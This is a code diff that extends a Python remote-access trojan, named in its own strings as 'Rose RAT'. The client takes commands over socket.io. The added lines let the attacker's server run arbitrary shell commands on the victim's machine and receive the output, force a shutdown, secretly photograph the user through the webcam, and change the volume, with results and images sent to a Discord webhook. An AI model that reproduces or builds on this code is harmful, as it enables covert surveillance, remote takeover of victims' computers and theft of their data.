@@ -1,14 +1,22 @@
 import socketio
 from dhooks import Webhook as web
 from dhooks import Embed, File
+
 from PIL import ImageGrab
+from pynput.keyboard import Key, Controller
+import cv2
+
 import random 
 import string
-import os
+
 import ctypes
+import os
+import subprocess
 
 from configuration import Config 
 cc = Config()
+
+# getting hwid = wmic csproduct get uuid
 
 from informations import Info
 ii = Info()
@@ -18,6 +26,7 @@ sio = socketio.Client()
 class CommandHandler():
     def __init__(self):
         self.webhook = web(cc.get_webhook())
+        self.keyboard = Controller()
         
     def screenshot(self):
         screenshot = ImageGrab.grab()
@@ -33,6 +42,75 @@ class CommandHandler():
         ICON_STOP = 0x10
         ctypes.windll.user32.MessageBoxW(0, message, "Error", MB_HELP | MB_YESNO | ICON_STOP)
         
+    def shell(self, instruction):
+        def _shell():
+            output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            return output
+        
+        try:    
+            result = str(_shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
+        except Exception as e:
+            result = str(f"Error | Advanced log: {e}")
+            
+        embed = Embed(
+            description='Rose RAT',
+            color=11495919,
+            timestamp='now'  # sets the timestamp to current time
+        )
+
+        embed.set_author(name=f"Shell command result | {instruction}", icon_url=cc.get_avatar())
+        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
+        embed.add_field(name="Result", value=f'`{result}`')
+        
+        self.webhook.send(embed=embed)
+        
+    def shutdown(self):
+        embed = Embed(
+            description='Rose RAT',
+            color=11495919,
+            timestamp='now'  # sets the timestamp to current time
+        )
+
+        embed.set_author(name=f"Shuting down the PC", icon_url=cc.get_avatar())
+        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
+        
+        self.webhook.send(embed=embed)
+        os.system("shutdown /s /t 1")
+        
+    def webcampic(self): #Take a picture with the webcam and send it with the webhook
+        try:
+            file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
+            cam = cv2.VideoCapture(0)   # 0 -> index of camera
+            s, img = cam.read()
+            if s:    # frame captured without any errors
+                cv2.imwrite(f"temp_{file_name}.jpg",img)
+
+            file = File(f"temp_{file_name}.jpg", name='Rose-Injector WebcamPIC.jpg') 
+            self.webhook.send(file=file)
+            os.remove(f"temp_{file_name}.jpg")
+        except Exception as e:
+            embed = Embed(
+            description='Rose RAT',
+                color=16399677,
+                timestamp='now'  # sets the timestamp to current time
+            )
+
+            embed.set_author(name=f"WebcamPIC Error", icon_url=cc.get_avatar())
+            embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
+            embed.add_field(name="Advanced log:", value=f'`{e}`')
+            
+            self.webhook.send(embed=embed)
+                
+    def volumeup(self):
+        for i in range(50):
+            self.keyboard.press(Key.media_volume_up)
+            self.keyboard.release(Key.media_volume_up)     
+              
+    def volumedown(self):
+        for i in range(50):
+            self.keyboard.press(Key.media_volume_down)
+            self.keyboard.release(Key.media_volume_down)  
+            
 cmdhandler = CommandHandler()
 
 @sio.event
@@ -50,9 +128,24 @@ def connect():
 def receive_command(data):
     if data['data'] == 'screenshot':
         cmdhandler.screenshot()
+        
     if data['data'].startswith('messagebox') is True:
         cmdhandler.messagebox(data['data'].split('messagebox', 1)[1])
+        
+    if data['data'].startswith('shell') is True:
+        cmdhandler.shell(data['data'].split('shell', 1)[1])
+    
+    if data['data'] == 'volumemax':
+        cmdhandler.volumeup()
+        
+    if data['data'] == 'volumezero':
+        cmdhandler.volumedown()
+        
+    if data['data'] == 'shutdown':
+        cmdhandler.shutdown()
 
+    if data['data'] == 'webcampic':
+        cmdhandler.webcampic()
 
 
 @sio.event
